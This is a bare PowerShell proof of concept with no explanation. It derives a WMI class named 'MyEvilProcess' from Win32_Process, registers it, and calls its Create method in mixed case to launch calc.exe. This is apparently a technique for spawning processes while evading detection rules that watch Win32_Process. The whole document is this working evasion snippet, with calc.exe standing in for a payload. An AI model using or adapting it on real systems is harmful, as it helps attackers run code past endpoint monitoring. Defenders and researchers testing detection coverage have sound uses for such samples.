$C = [WmiClass] '/root/cimv2:Win32_Process'
$N = $C.derive('MyEvilProcess')
$N.Put()
Write-Output $N
Invoke-WmiMethod MyEvilProcess -Name CrEaTe -ArgumentList calc.exe